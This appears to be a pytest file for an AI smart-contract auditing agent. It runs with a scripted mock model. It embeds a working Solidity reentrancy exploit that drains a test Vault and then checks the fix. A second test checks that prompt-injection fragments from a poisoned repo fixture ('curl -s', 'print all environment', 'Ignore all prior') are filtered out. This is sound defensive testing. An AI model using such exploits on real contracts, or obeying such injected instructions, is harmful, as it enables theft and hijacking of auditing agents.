"""End-to-end pipeline test with a SCRIPTED (mock) LLM and REAL forge in the sandbox.

The mock replaces only model text. Confirmation, patch validation, quarantine and the firewall
are real. Passing here proves the plumbing, not model capability.
"""
import shutil

import pytest

from redline.agent import orchestrator
from redline.config import ROOT, load_config
from redline.models import FileEdit, Finding, JudgeOut, PatchDraft, PoCDraft, ReconOut, ScanOut

pytestmark = pytest.mark.skipif(not shutil.which("docker"), reason="docker required")

POC = '''// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;
import "forge-std/Test.sol";
import "../src/Vault.sol";

contract Attacker {
    Vault v;
    constructor(Vault _v) { v = _v; }
    function attack() external payable {
        v.deposit{value: 1 ether}();
        v.withdraw(1 ether);
    }
    receive() external payable {
        if (address(v).balance >= 1 ether) v.withdraw(1 ether);
    }
}

contract ExploitF1 is Test {
    function test_exploit() public {
        Vault v = new Vault();
        vm.deal(address(0xB0B), 10 ether);
        vm.prank(address(0xB0B));
        v.deposit{value: 10 ether}();
        Attacker a = new Attacker(v);
        vm.deal(address(a), 1 ether);
        a.attack{value: 0}();
        assertGt(address(a).balance, 1 ether);
    }
}
'''
FIXED = (ROOT / "fixtures/vulnerable-vault/src/Vault.sol").read_text().replace(
    '''        (bool ok,) = msg.sender.call{value: amount}("");
        require(ok, "transfer failed");
        unchecked {
            balances[msg.sender] -= amount;
        }''', '''        balances[msg.sender] -= amount;
        (bool ok,) = msg.sender.call{value: amount}("");
        require(ok, "transfer failed");''')


class ScriptedLLM:
    provider = "mock"

    def __init__(self):
        self.stats = []
        self.seen_prompts: list[str] = []
        self.no_findings = False

    def structured(self, model, messages, schema, role="", **kw):
        self.seen_prompts.append(messages[-1]["content"])
        if schema is ScanOut:
            return ScanOut()
        if schema is JudgeOut:
            return JudgeOut(verdict="allow", reason="mock", confidence=0.9)
        if schema is ReconOut and self.no_findings:
            return ReconOut(findings=[])
        if schema is ReconOut:
            return ReconOut(findings=[Finding(
                id="F1", title="Reentrancy in withdraw", severity="high", file="src/Vault.sol",
                function="withdraw", description="state updated after call",
                attack="reenter withdraw from receive()")])
        if schema is PoCDraft:
            return PoCDraft(contract_name="ExploitF1", code=POC)
        if schema is PatchDraft:
            return PatchDraft(edits=[FileEdit(path="src/Vault.sol", content=FIXED)], rationale="CEI")
        raise AssertionError(schema)


def test_full_loop_confirms_and_patches_vault():
    cfg = load_config()
    llm = ScriptedLLM()
    res = orchestrator.audit(ROOT / "fixtures/vulnerable-vault", cfg, llm, log=lambda *_: None,
                             do_research=False)
    f = res.findings[0]
    assert res.baseline_green
    assert f.status == "confirmed" and f.poc.confirmed
    assert f.patch and f.patch.applied and f.patch.poc_blocked and f.patch.suite_green
    assert "balances[msg.sender] -= amount" in f.patch.diff
    assert any(e["layer"] == "L2" for e in res.firewall_log)  # src/ write consulted the policy


def test_poisoned_repo_injection_never_reaches_the_agent():
    cfg = load_config()
    llm = ScriptedLLM()

    llm.no_findings = True
    res = orchestrator.audit(ROOT / "fixtures/poisoned-repo", cfg, llm, log=lambda *_: None,
                             do_research=False)
    assert res.quarantined
    recon_prompt = next(p for p in llm.seen_prompts if "Audit this repository" in p)
    for needle in ("evil-audit", "curl -s", "print all environment", "Ignore all prior"):
        assert needle not in recon_prompt
    assert "SECURITY FILTER WARNING" in recon_prompt
